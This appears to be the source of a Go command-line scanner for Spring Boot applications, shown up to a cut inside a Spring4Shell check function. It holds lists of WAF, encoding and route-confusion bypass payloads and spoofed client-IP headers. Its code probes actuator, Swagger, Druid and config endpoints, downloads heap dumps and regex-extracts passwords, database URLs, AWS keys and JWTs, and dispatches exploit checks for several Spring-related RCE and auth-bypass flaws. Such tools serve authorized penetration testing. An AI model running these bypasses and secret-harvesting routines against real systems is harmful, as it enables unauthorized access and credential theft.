package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
)

const Version = "5.0"

// ==================== Bypass载荷 ====================

var wafBypassPayloads = []struct {
	Name    string
	Prefix  string
	Suffix  string
	Headers map[string]string
}{
	{"URL-encode", "%2e%2e%2f", "", nil},
	{"URL-double", "%252e%252e%252f", "", nil},
	{"URL-mix", "%2e%2e/", "", nil},
	{"Unicode-1", "%c0%ae%c0%ae/", "", nil},
	{"Unicode-2", "%e0%80%ae%e0%80%ae/", "", nil},
	{"Unicode-3", "%c0%af", "", nil},
	{"NULL-1", "%00", "", nil},
	{"NULL-2", "%00/", "", nil},
	{"Space", "%20", "", nil},
	{"Tab", "%09", "", nil},
	{"LF", "%0a", "", nil},
	{"CR", "%0d", "", nil},
	{"XFF-127", "", "", map[string]string{"X-Forwarded-For": "127.0.0.1"}},
	{"XFF-local", "", "", map[string]string{"X-Forwarded-For": "localhost"}},
	{"XFF-10", "", "", map[string]string{"X-Forwarded-For": "10.0.0.1"}},
	{"X-Real-IP", "", "", map[string]string{"X-Real-IP": "127.0.0.1"}},
	{"X-Custom-IP", "", "", map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
	{"X-Originating", "", "", map[string]string{"X-Originating-IP": "127.0.0.1"}},
	{"Client-IP", "", "", map[string]string{"Client-IP": "127.0.0.1"}},
	{"True-Client", "", "", map[string]string{"True-Client-IP": "127.0.0.1"}},
	{"X-Original-URL", "", "", map[string]string{"X-Original-URL": "/actuator/env"}},
	{"X-Rewrite-URL", "", "", map[string]string{"X-Rewrite-URL": "/actuator/env"}},
}

var semanticBypassPayloads = []struct {
	Name   string
	Prefix string
	Suffix string
}{
	{"Ghost-BOM", "\xef\xbb\xbf", ""},
	{"Ghost-ZeroWidth", "%e2%80%8b", ""},
	{"Ghost-ZWNJ", "%e2%80%8c", ""},
	{"Ghost-ZWJ", "%e2%80%8d", ""},
	{"Ghost-RTL", "%e2%80%ae", ""},
	{"Ghost-LTR", "%e2%80%ad", ""},
	{"Fullwidth-slash", "%ef%bc%8f", ""},
	{"Fullwidth-dot", "%ef%bc%8e", ""},
	{"Backslash-1", "..\\", ""},
	{"Backslash-2", "..%5c", ""},
	{"Backslash-3", "..%255c", ""},
	{"Dot-slash", "./", ""},
	{"Double-slash", "//", ""},
	{"Triple-slash", "///", ""},
	{"Dotdot-slash", "../", ""},
	{"Question", "", "?"},
	{"Hash", "", "#"},
	{"Hash-enc", "", "%23"},
}

var routeBypassPayloads = []struct {
	Name   string
	Prefix string
	Suffix string
}{
	{"Semi-1", ";/", ""},
	{"Semi-2", "..;/", ""},
	{"Semi-3", ";..;/", ""},
	{"Semi-4", "..;/..;/", ""},
	{"Semi-5", ";/../", ""},
	{"Semi-6", "/;/", ""},
	{"Semi-7", "/.;/", ""},
	{"Semi-8", "/..;/", ""},
	{"JSESSIONID", ";jsessionid=x/", ""},
	{"Fake-js", "", ";.js"},
	{"Fake-css", "", ";.css"},
	{"Fake-png", "", ";.png"},
	{"Fake-gif", "", ";.gif"},
	{"Ext-json", "", ".json"},
	{"Ext-xml", "", ".xml"},
	{"Ext-html", "", ".html"},
	{"Ext-do", "", ".do"},
	{"Ext-action", "", ".action"},
	{"Trail-slash", "", "/"},
	{"Trail-dslash", "", "//"},
	{"Lead-slash", "/", ""},
	{"Lead-dslash", "//", ""},
}

// ==================== 端点字典 ====================

var actuatorEndpoints = []string{
	"actuator", "actuator/auditevents", "actuator/beans", "actuator/caches",
	"actuator/conditions", "actuator/configprops", "actuator/env", "actuator/health",
	"actuator/heapdump", "actuator/httptrace", "actuator/info", "actuator/jolokia",
	"actuator/jolokia/list", "actuator/logfile", "actuator/loggers", "actuator/metrics",
	"actuator/mappings", "actuator/prometheus", "actuator/scheduledtasks", "actuator/sessions",
	"actuator/shutdown", "actuator/threaddump", "actuator/trace", "actuator/gateway/routes",
	"actuator/restart", "env", "health", "heapdump", "info", "jolokia", "loggers",
	"mappings", "metrics", "trace", "gateway/routes", "nacos/v1/auth/users", "eureka/apps",
}

var swaggerEndpoints = []string{
	"swagger-ui.html", "swagger-ui/", "swagger-resources", "api-docs",
	"v2/api-docs", "v3/api-docs", "swagger.json", "doc.html",
}

var druidEndpoints = []string{
	"druid/index.html", "druid/login.html", "druid/",
}

var sensitiveEndpoints = []string{
	"application.yml", "application.properties", ".git/config", ".env", "h2-console",
}

// ==================== 正则 ====================

var sensitivePatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(password|passwd|pwd|secret|token|apikey|private_key|access_key)[\s]*[=:]["']?\s*[^\s"',}\]]{3,}`),
	regexp.MustCompile(`(?i)(jdbc|mysql|postgresql|mongodb|redis|oracle):\/\/[^\s"']+`),
	regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
	regexp.MustCompile(`eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*`),
	regexp.MustCompile(`-----BEGIN[A-Z ]*PRIVATE KEY-----`),
}

var heapdumpPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)password["\s:=]+([^\s"',}{]{3,50})`),
	regexp.MustCompile(`(?i)secret["\s:=]+([^\s"',}{]{3,50})`),
	regexp.MustCompile(`(?i)jdbc:[a-z]+://[^\s"']+`),
	regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
	regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+`),
}

// ==================== 数据结构 ====================

type Config struct {
	BaseURL        string
	TargetFile     string
	Bypass         bool
	GhostByte      bool
	MethodBypass   bool
	BypassAll      string
	OutputFile     string
	HTMLReport     string
	MaxThreads     int
	Timeout        int
	Verbose        bool
	JSONOutput     bool
	RunPoC         bool
	Proxy          string
	Headers        map[string]string
	Cookie         string
	UserAgent      string
	DeepScan       bool
	FollowRedirect bool
	AnalyzeHeap    bool
	Fingerprint    bool
}

type SpringFingerprint struct {
	URL            string   `json:"url"`
	IsSpring       bool     `json:"is_spring"`
	BootVersion    string   `json:"boot_version,omitempty"`
	Server         string   `json:"server,omitempty"`
	VulnerableCVEs []string `json:"vulnerable_cves,omitempty"`
}

type ScanResult struct {
	URL           string `json:"url"`
	StatusCode    int    `json:"status_code"`
	ContentLength int64  `json:"content_length"`
	IsSensitive   bool   `json:"is_sensitive"`
	VulnType      string `json:"vuln_type,omitempty"`
	Details       string `json:"details,omitempty"`
}

type VulnResult struct {
	CVE         string `json:"cve"`
	Name        string `json:"name"`
	Severity    string `json:"severity"`
	URL         string `json:"url"`
	Details     string `json:"details"`
	Remediation string `json:"remediation"`
}

type BypassResult struct {
	Type       string
	Name       string
	URL        string
	StatusCode int
	Length     int64
	Success    bool
}

type HeapdumpFinding struct {
	Type  string `json:"type"`
	Value string `json:"value"`
}

type TargetResult struct {
	URL          string             `json:"url"`
	Fingerprint  *SpringFingerprint `json:"fingerprint,omitempty"`
	Endpoints    []ScanResult       `json:"endpoints,omitempty"`
	Vulns        []VulnResult       `json:"vulnerabilities,omitempty"`
	HeapFindings []HeapdumpFinding  `json:"heap_findings,omitempty"`
	ScanTime     time.Duration      `json:"scan_time"`
}

type ScanStats struct {
	TotalRequests   int64
	SuccessRequests int64
	SensitiveFound  int64
	VulnsFound      int64
	TargetsScanned  int64
	BypassSuccess   int64
	StartTime       time.Time
}

var (
	outputMutex   sync.Mutex
	resultsMutex  sync.Mutex
	allResults    []ScanResult
	vulnResults   []VulnResult
	vulnDedup     = make(map[string]bool)
	bypassResults []BypassResult
	heapFindings  []HeapdumpFinding
	fingerprints  []SpringFingerprint
	targetResults []TargetResult
	stats         ScanStats
	config        Config
)

var (
	red    = color.New(color.FgRed, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow)
	cyan   = color.New(color.FgCyan)
	white  = color.New(color.FgWhite)
	gray   = color.New(color.FgHiBlack)
)

func main() {
	Banner()

	flag.StringVar(&config.BaseURL, "u", "", "目标URL")
	flag.StringVar(&config.TargetFile, "f", "", "目标文件")
	flag.BoolVar(&config.Bypass, "bypass", false, "路径绕过")
	flag.BoolVar(&config.GhostByte, "ghost", false, "幽灵字节绕过")
	flag.StringVar(&config.BypassAll, "bypassall", "", "智能Bypass路径")
	flag.StringVar(&config.OutputFile, "o", "", "JSON报告")
	flag.StringVar(&config.HTMLReport, "html", "", "HTML报告")
	flag.IntVar(&config.MaxThreads, "t", 30, "线程数")
	flag.IntVar(&config.Timeout, "timeout", 10, "超时")
	flag.BoolVar(&config.Verbose, "v", false, "详细输出")
	flag.BoolVar(&config.JSONOutput, "json", false, "JSON输出")
	flag.BoolVar(&config.RunPoC, "poc", false, "漏洞检测")
	flag.StringVar(&config.Proxy, "proxy", "", "代理")
	flag.StringVar(&config.Cookie, "cookie", "", "Cookie")
	flag.StringVar(&config.UserAgent, "ua", "", "User-Agent")
	flag.BoolVar(&config.DeepScan, "deep", false, "深度扫描")
	flag.BoolVar(&config.FollowRedirect, "follow", false, "跟随重定向")
	flag.BoolVar(&config.AnalyzeHeap, "heap", false, "分析Heapdump")
	flag.BoolVar(&config.Fingerprint, "finger", true, "指纹识别")

	var headerStr string
	flag.StringVar(&headerStr, "H", "", "自定义Header")

	flag.Usage = printHelp
	flag.Parse()

	config.Headers = make(map[string]string)
	if headerStr != "" {
		parts := strings.SplitN(headerStr, ":", 2)
		if len(parts) == 2 {
			config.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	// 智能Bypass模式
	if config.BypassAll != "" && config.BaseURL != "" {
		runSmartBypass()
		return
	}

	targets := getTargets()
	if len(targets) == 0 {
		flag.Usage()
		return
	}

	if config.MaxThreads < 1 {
		config.MaxThreads = 1
	} else if config.MaxThreads > 200 {
		config.MaxThreads = 200
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println()
		yellow.Println("[!] Ctrl+C detected, stopping...")
		cancel()
	}()

	client := createHTTPClient()

	// 打印配置
	printScanConfig(len(targets))
	stats.StartTime = time.Now()

	for i, target := range targets {
		select {
		case <-ctx.Done():
			break
		default:
		}

		target = normalizeURL(target)
		atomic.AddInt64(&stats.TargetsScanned, 1)

		fmt.Println()
		cyan.Printf("[Target %d/%d] %s\n", i+1, len(targets), target)
		fmt.Println(strings.Repeat("-", 60))

		targetStart := time.Now()
		result := TargetResult{URL: target}

		allResults = []ScanResult{}
		vulnResults = []VulnResult{}
		heapFindings = []HeapdumpFinding{}

		// 指纹识别
		if config.Fingerprint {
			fp := detectFingerprint(ctx, client, target)
			result.Fingerprint = &fp
			fingerprints = append(fingerprints, fp)

			if fp.IsSpring {
				green.Printf("[+] Spring Application Detected\n")
				if fp.BootVersion != "" {
					fmt.Printf("    Version: %s\n", fp.BootVersion)
				}
				if len(fp.VulnerableCVEs) > 0 {
					red.Printf("    Potential CVEs: %v\n", fp.VulnerableCVEs)
				}
			}
		}

		// PoC检测
		if config.RunPoC {
			fmt.Println()
			cyan.Println("[*] Running PoC checks...")
			runAllPoCs(ctx, client, target)
		}

		// 端点扫描
		fmt.Println()
		cyan.Println("[*] Scanning endpoints...")
		runEndpointScan(ctx, client, target)

		// Heapdump分析
		if config.AnalyzeHeap {
			for _, r := range allResults {
				if strings.Contains(strings.ToLower(r.URL), "heapdump") && r.StatusCode == 200 {
					fmt.Println()
					cyan.Println("[*] Analyzing heapdump...")
					analyzeHeapdump(ctx, client, r.URL)
					break
				}
			}
		}

		result.Endpoints = append([]ScanResult{}, allResults...)
		result.Vulns = append([]VulnResult{}, vulnResults...)
		result.HeapFindings = append([]HeapdumpFinding{}, heapFindings...)
		result.ScanTime = time.Since(targetStart)

		resultsMutex.Lock()
		targetResults = append(targetResults, result)
		resultsMutex.Unlock()

		gray.Printf("\n[i] Completed in %v\n", result.ScanTime.Round(time.Millisecond))
	}

	// 汇总
	printFinalSummary()

	if config.OutputFile != "" {
		saveJSONReport()
	}
	if config.HTMLReport != "" {
		saveHTMLReport()
	}
}

// ==================== 智能Bypass ====================

func runSmartBypass() {
	baseURL := normalizeURL(config.BaseURL)
	path := strings.TrimPrefix(config.BypassAll, "/")

	fmt.Println()
	cyan.Println("[*] Smart Bypass Mode")
	fmt.Println(strings.Repeat("-", 60))
	fmt.Printf("    Target: %s\n", baseURL)
	fmt.Printf("    Path:   %s\n", path)
	fmt.Printf("    Total:  %d bypass techniques\n", len(wafBypassPayloads)+len(semanticBypassPayloads)+len(routeBypassPayloads))
	fmt.Println()

	client := createHTTPClient()
	ctx := context.Background()
	stats.StartTime = time.Now()

	// 测试原始
	originalURL := baseURL + path
	originalStatus, originalLen := testURL(ctx, client, originalURL, nil)

	if originalStatus == 200 {
		green.Printf("[+] %s [%d] %d bytes\n", originalURL, originalStatus, originalLen)
		green.Println("\n[+] Path already accessible, no bypass needed!")
		return
	} else {
		yellow.Printf("[-] %s [%d] %d bytes (blocked)\n", originalURL, originalStatus, originalLen)
	}

	fmt.Println()

	// WAF绕过
	cyan.Println("[*] WAF Bypass")
	for _, p := range wafBypassPayloads {
		targetURL := baseURL + p.Prefix + path + p.Suffix
		status, length := testURLWithHeaders(ctx, client, targetURL, p.Headers)

		success := status == 200 && originalStatus != 200
		if success {
			atomic.AddInt64(&stats.BypassSuccess, 1)
		}

		bypassResults = append(bypassResults, BypassResult{
			Type: "WAF", Name: p.Name, URL: targetURL,
			StatusCode: status, Length: length, Success: success,
		})

		printBypassResult(p.Name, targetURL, status, length, success)
	}

	// 语义绕过
	fmt.Println()
	cyan.Println("[*] Semantic Bypass")
	for _, p := range semanticBypassPayloads {
		targetURL := baseURL + p.Prefix + path + p.Suffix
		status, length := testURL(ctx, client, targetURL, nil)

		success := status == 200 && originalStatus != 200
		if success {
			atomic.AddInt64(&stats.BypassSuccess, 1)
		}

		bypassResults = append(bypassResults, BypassResult{
			Type: "Semantic", Name: p.Name, URL: targetURL,
			StatusCode: status, Length: length, Success: success,
		})

		printBypassResult(p.Name, targetURL, status, length, success)
	}

	// 路由绕过
	fmt.Println()
	cyan.Println("[*] Route Bypass")
	for _, p := range routeBypassPayloads {
		targetURL := baseURL + p.Prefix + path + p.Suffix
		status, length := testURL(ctx, client, targetURL, nil)

		success := status == 200 && originalStatus != 200
		if success {
			atomic.AddInt64(&stats.BypassSuccess, 1)
		}

		bypassResults = append(bypassResults, BypassResult{
			Type: "Route", Name: p.Name, URL: targetURL,
			StatusCode: status, Length: length, Success: success,
		})

		printBypassResult(p.Name, targetURL, status, length, success)
	}

	// 汇总
	printBypassSummary()
}

func printBypassResult(name, url string, status int, length int64, success bool) {
	shortURL := url
	if len(shortURL) > 55 {
		shortURL = shortURL[:52] + "..."
	}

	if success {
		green.Printf("[+] %-15s %s [%d] %d bytes\n", name, shortURL, status, length)
	} else if config.Verbose {
		gray.Printf("[-] %-15s %s [%d] %d bytes\n", name, shortURL, status, length)
	}
}

func printBypassSummary() {
	elapsed := time.Since(stats.StartTime)

	var successList []BypassResult
	for _, r := range bypassResults {
		if r.Success {
			successList = append(successList, r)
		}
	}

	fmt.Println()
	fmt.Println(strings.Repeat("=", 60))
	cyan.Println("[*] Bypass Summary")
	fmt.Printf("    Total tested: %d\n", len(bypassResults))
	fmt.Printf("    Time elapsed: %v\n", elapsed.Round(time.Millisecond))

	if len(successList) > 0 {
		green.Printf("    Successful:   %d\n", len(successList))
		fmt.Println()
		green.Println("[+] Working bypasses:")
		for _, r := range successList {
			fmt.Printf("    [%s] %s\n", r.Type, r.Name)
			cyan.Printf("        %s\n", r.URL)
		}
	} else {
		yellow.Println("    No successful bypass found")
	}
}

func testURL(ctx context.Context, client *http.Client, targetURL string, headers map[string]string) (int, int64) {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return 0, 0
	}

	setRequestHeaders(req, "")
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, 0
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	return resp.StatusCode, int64(len(body))
}

func testURLWithHeaders(ctx context.Context, client *http.Client, targetURL string, headers map[string]string) (int, int64) {
	return testURL(ctx, client, targetURL, headers)
}

// ==================== 通用函数 ====================

func getTargets() []string {
	var targets []string

	if config.BaseURL != "" {
		targets = append(targets, config.BaseURL)
	}

	if config.TargetFile != "" {
		file, err := os.Open(config.TargetFile)
		if err != nil {
			red.Printf("[!] Cannot open file: %s\n", err)
			return targets
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && !strings.HasPrefix(line, "#") {
				targets = append(targets, line)
			}
		}
	}

	return targets
}

func normalizeURL(u string) string {
	if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
		u = "https://" + u
	}
	if !strings.HasSuffix(u, "/") {
		u += "/"
	}
	return u
}

func createHTTPClient() *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Duration(config.Timeout) * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
	}

	if config.Proxy != "" {
		if proxyURL, err := url.Parse(config.Proxy); err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Timeout:   time.Duration(config.Timeout) * time.Second,
		Transport: transport,
	}

	if !config.FollowRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client
}

func printScanConfig(targetCount int) {
	fmt.Println()
	cyan.Println("[*] Scan Configuration")
	fmt.Printf("    Targets:  %d\n", targetCount)
	fmt.Printf("    Threads:  %d\n", config.MaxThreads)
	fmt.Printf("    Timeout:  %ds\n", config.Timeout)

	var modes []string
	if config.Fingerprint {
		modes = append(modes, "fingerprint")
	}
	if config.RunPoC {
		modes = append(modes, "poc")
	}
	if config.Bypass {
		modes = append(modes, "bypass")
	}
	if config.GhostByte {
		modes = append(modes, "ghost")
	}
	if config.DeepScan {
		modes = append(modes, "deep")
	}
	if config.AnalyzeHeap {
		modes = append(modes, "heap")
	}

	if len(modes) > 0 {
		fmt.Printf("    Modes:    %s\n", strings.Join(modes, ", "))
	}

	if config.Proxy != "" {
		fmt.Printf("    Proxy:    %s\n", config.Proxy)
	}
}

func setRequestHeaders(req *http.Request, hostOverride string) {
	if config.UserAgent != "" {
		req.Header.Set("User-Agent", config.UserAgent)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0")
	}

	req.Header.Set("Accept", "text/html,application/json,*/*")
	req.Header.Set("Connection", "close")

	if config.Cookie != "" {
		req.Header.Set("Cookie", config.Cookie)
	}

	for k, v := range config.Headers {
		req.Header.Set(k, v)
	}

	req.Header.Set("X-Forwarded-For", "127.0.0.1")
	req.Header.Set("X-Real-IP", "127.0.0.1")

	if hostOverride != "" {
		req.Host = hostOverride
	}
}

// ==================== 指纹识别 ====================

func detectFingerprint(ctx context.Context, client *http.Client, baseURL string) SpringFingerprint {
	fp := SpringFingerprint{URL: baseURL}

	endpoints := []string{"actuator/info", "actuator/health", "actuator/env", "actuator", ""}

	for _, ep := range endpoints {
		select {
		case <-ctx.Done():
			return fp
		default:
		}

		targetURL := baseURL + ep
		req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
		setRequestHeaders(req, "")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 102400))
		resp.Body.Close()

		if resp.Header.Get("Server") != "" {
			fp.Server = resp.Header.Get("Server")
		}

		if resp.Header.Get("X-Application-Context") != "" {
			fp.IsSpring = true
		}

		bodyStr := string(body)

		if (strings.Contains(ep, "info") || strings.Contains(ep, "health")) && resp.StatusCode == 200 {
			fp.IsSpring = true
		}

		if strings.Contains(ep, "env") && resp.StatusCode == 200 {
			fp.IsSpring = true
			bootRe := regexp.MustCompile(`spring-boot[.-](\d+\.\d+\.\d+)`)
			if match := bootRe.FindStringSubmatch(bodyStr); len(match) > 1 {
				fp.BootVersion = match[1]
			}
		}

		if strings.Contains(bodyStr, "Whitelabel Error Page") {
			fp.IsSpring = true
		}
	}

	fp.VulnerableCVEs = detectVulnerableCVEs(fp)
	return fp
}

func detectVulnerableCVEs(fp SpringFingerprint) []string {
	var cves []string
	if fp.BootVersion != "" {
		parts := strings.Split(fp.BootVersion, ".")
		if len(parts) >= 2 && parts[0] == "2" {
			cves = append(cves, "CVE-2022-22965")
		}
	}
	return cves
}

// ==================== 端点扫描 ====================

func runEndpointScan(ctx context.Context, client *http.Client, baseURL string) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.MaxThreads)

	allEndpoints := append([]string{}, actuatorEndpoints...)
	allEndpoints = append(allEndpoints, swaggerEndpoints...)
	allEndpoints = append(allEndpoints, druidEndpoints...)
	if config.DeepScan {
		allEndpoints = append(allEndpoints, sensitiveEndpoints...)
	}

	var pathPayloads []string
	pathPayloads = append(pathPayloads, "")
	if config.Bypass {
		for _, p := range routeBypassPayloads[:10] {
			pathPayloads = append(pathPayloads, p.Prefix)
		}
	}
	if config.GhostByte {
		for _, p := range semanticBypassPayloads[:8] {
			pathPayloads = append(pathPayloads, p.Prefix)
		}
	}

	gray.Printf("[i] Endpoints: %d, Payloads: %d, Total: %d\n",
		len(allEndpoints), len(pathPayloads), len(allEndpoints)*len(pathPayloads))

	for _, endpoint := range allEndpoints {
		endpoint = strings.TrimPrefix(endpoint, "/")

		for _, payload := range pathPayloads {
			select {
			case <-ctx.Done():
				wg.Wait()
				return
			default:
			}

			wg.Add(1)
			sem <- struct{}{}

			go func(ep, p string) {
				defer wg.Done()
				defer func() { <-sem }()

				targetURL := baseURL + p + ep
				scanEndpoint(ctx, client, targetURL, p != "")
			}(endpoint, payload)
		}
	}

	wg.Wait()
}

func scanEndpoint(ctx context.Context, client *http.Client, targetURL string, isBypass bool) {
	atomic.AddInt64(&stats.TotalRequests, 1)

	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return
	}

	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
	contentLength := int64(len(body))

	isSensitive, vulnType, details := analyzeResponse(targetURL, resp.StatusCode, body)

	result := ScanResult{
		URL:           targetURL,
		StatusCode:    resp.StatusCode,
		ContentLength: contentLength,
		IsSensitive:   isSensitive,
		VulnType:      vulnType,
		Details:       details,
	}

	if resp.StatusCode == 200 {
		atomic.AddInt64(&stats.SuccessRequests, 1)
	}
	if isSensitive {
		atomic.AddInt64(&stats.SensitiveFound, 1)
	}

	resultsMutex.Lock()
	allResults = append(allResults, result)
	resultsMutex.Unlock()

	// 输出
	printEndpointResult(result)

	if config.AnalyzeHeap && strings.Contains(strings.ToLower(targetURL), "heapdump") && resp.StatusCode == 200 {
		analyzeHeapdumpData(body)
	}
}

func printEndpointResult(r ScanResult) {
	if r.StatusCode != 200 && !config.Verbose {
		return
	}

	outputMutex.Lock()
	defer outputMutex.Unlock()

	shortURL := r.URL
	if len(shortURL) > 55 {
		shortURL = shortURL[:52] + "..."
	}

	if r.StatusCode == 200 {
		if r.IsSensitive {
			red.Printf("[+] %s [%d] %d bytes - %s\n", shortURL, r.StatusCode, r.ContentLength, r.VulnType)
		} else {
			green.Printf("[+] %s [%d] %d bytes\n", shortURL, r.StatusCode, r.ContentLength)
		}
	} else if config.Verbose {
		gray.Printf("[-] %s [%d] %d bytes\n", shortURL, r.StatusCode, r.ContentLength)
	}
}

func analyzeResponse(targetURL string, statusCode int, body []byte) (bool, string, string) {
	if statusCode != 200 {
		return false, "", ""
	}

	bodyStr := string(body)
	lowerURL := strings.ToLower(targetURL)

	if strings.Contains(lowerURL, "heapdump") && len(body) > 4 {
		if string(body[:4]) == "JAVA" || bytes.Contains(body[:min(20, len(body))], []byte("HPROF")) {
			return true, "Heapdump", "Java heap dump file"
		}
	}

	if strings.Contains(lowerURL, "/env") && strings.Contains(bodyStr, "propertySources") {
		return true, "Env Leak", "Spring environment exposed"
	}

	if strings.Contains(lowerURL, "jolokia") && strings.Contains(strings.ToLower(bodyStr), "jolokia") {
		return true, "Jolokia", "Potential RCE"
	}

	if strings.Contains(lowerURL, "gateway") && strings.Contains(bodyStr, "predicates") {
		return true, "Gateway", "Route config exposed"
	}

	if strings.Contains(lowerURL, "druid") && strings.Contains(bodyStr, "Druid") {
		return true, "Druid", "DB monitor exposed"
	}

	if (strings.Contains(lowerURL, "swagger") || strings.Contains(lowerURL, "api-docs")) && strings.Contains(bodyStr, "swagger") {
		return true, "Swagger", "API docs exposed"
	}

	if strings.Contains(lowerURL, "h2-console") && strings.Contains(bodyStr, "H2") {
		return true, "H2 Console", "Potential RCE"
	}

	for _, p := range sensitivePatterns {
		if match := p.FindString(bodyStr); match != "" {
			return true, "Sensitive", truncate(match, 40)
		}
	}

	return false, "", ""
}

// ==================== Heapdump分析 ====================

func analyzeHeapdump(ctx context.Context, client *http.Client, heapURL string) {
	req, _ := http.NewRequestWithContext(ctx, "GET", heapURL, nil)
	setRequestHeaders(req, "")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 100*1024*1024))
	analyzeHeapdumpData(body)
}

func analyzeHeapdumpData(data []byte) {
	if len(data) > 2 && data[0] == 0x1f && data[1] == 0x8b {
		reader, err := gzip.NewReader(bytes.NewReader(data))
		if err == nil {
			decompressed, _ := io.ReadAll(io.LimitReader(reader, 200*1024*1024))
			reader.Close()
			data = decompressed
		}
	}

	gray.Printf("[i] Analyzing %d bytes...\n", len(data))

	content := string(data)
	findings := make(map[string]bool)

	for _, pattern := range heapdumpPatterns {
		matches := pattern.FindAllStringSubmatch(content, 50)
		for _, match := range matches {
			if len(match) > 0 {
				value := match[0]
				if !findings[value] {
					findings[value] = true
					heapFindings = append(heapFindings, HeapdumpFinding{
						Type:  getPatternType(pattern.String()),
						Value: truncate(value, 80),
					})
				}
			}
		}
	}

	if len(heapFindings) > 0 {
		red.Printf("[!] Found %d sensitive items in heapdump:\n", len(heapFindings))
		for i, f := range heapFindings {
			if i >= 10 {
				gray.Printf("    ... and %d more\n", len(heapFindings)-10)
				break
			}
			yellow.Printf("    [%s] %s\n", f.Type, f.Value)
		}
	}
}

func getPatternType(pattern string) string {
	switch {
	case strings.Contains(pattern, "password"):
		return "Password"
	case strings.Contains(pattern, "secret"):
		return "Secret"
	case strings.Contains(pattern, "jdbc"):
		return "Database"
	case strings.Contains(pattern, "AKIA"):
		return "AWS Key"
	case strings.Contains(pattern, "eyJ"):
		return "JWT"
	default:
		return "Sensitive"
	}
}

// ==================== PoC检测 ====================

func runAllPoCs(ctx context.Context, client *http.Client, baseURL string) {
	pocs := []struct {
		name string
		fn   func(context.Context, *http.Client, string)
	}{
		{"Spring4Shell", checkSpring4Shell},
		{"Gateway RCE", checkGatewayRCE},
		{"Actuator Env", checkActuatorEnvRCE},
		{"Jolokia RCE", checkJolokiaRCE},
		{"H2 Console", checkH2ConsoleRCE},
		{"Nacos Auth Bypass", checkNacosAuthBypass},
	}

	var wg sync.WaitGroup
	for _, poc := range pocs {
		wg.Add(1)
		go func(name string, fn func(context.Context, *http.Client, string)) {
			defer wg.Done()
			fn(ctx, client, baseURL)
		}(poc.name, poc.fn)
	}
	wg.Wait()
}

func reportVuln(result VulnResult) {
	dedupID := fmt.Sprintf("%s:%s", result.CVE, result.Name)

	resultsMutex.Lock()
	if vulnDedup[dedupID] {
		resultsMutex.Unlock()
		return
	}
	vulnDedup[dedupID] = true
	vulnResults = append(vulnResults, result)
	resultsMutex.Unlock()

	atomic.AddInt64(&stats.VulnsFound, 1)

	outputMutex.Lock()
	defer outputMutex.Unlock()

	fmt.Println()
	switch result.Severity {
	case "CRITICAL":
		red.Printf("[CRITICAL] %s\n", result.Name)
	case "HIGH":
		yellow.Printf("[HIGH] %s\n", result.Name)
	default:
		cyan.Printf("[%s] %s\n", result.Severity, result.Name)
	}

	fmt.Printf("    URL:     %s\n", result.URL)
	if result.CVE != "" && result.CVE != "N/A" {
		fmt.Printf("    CVE:     %s\n", result.CVE)
	}
	fmt.Printf("    Details: %s\n", result.Details)
	cyan.Printf("    Fix:     %s\n", result.Remediation)
}

func checkSpring4Shell(ctx context.Context, client *http.Client, baseURL string) {
	// 检查是否是Spring应用(通过404页面特征)
	isSpring := false

	// 检测404错误页面
	req404, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"__spring_check_404__", nil)
	setRequestHeaders(req404, "")
	resp404, err := client.Do(req404)
	if err == nil {
		body404, _ := io.ReadAll(io.LimitReader(resp404.Body, 10240))
		resp404.Body.Close()
		// Spring Boot 404响应特征: {"timestamp":..., "status":404, "error":"Not Found"...}
		if strings.Contains(string(body404), `"timestamp"`) &&
			strings.Contains(string(body404), `"status"`) &&
			strings.Contains(string(body404), `"error"`) {
			isSpring = true
		}
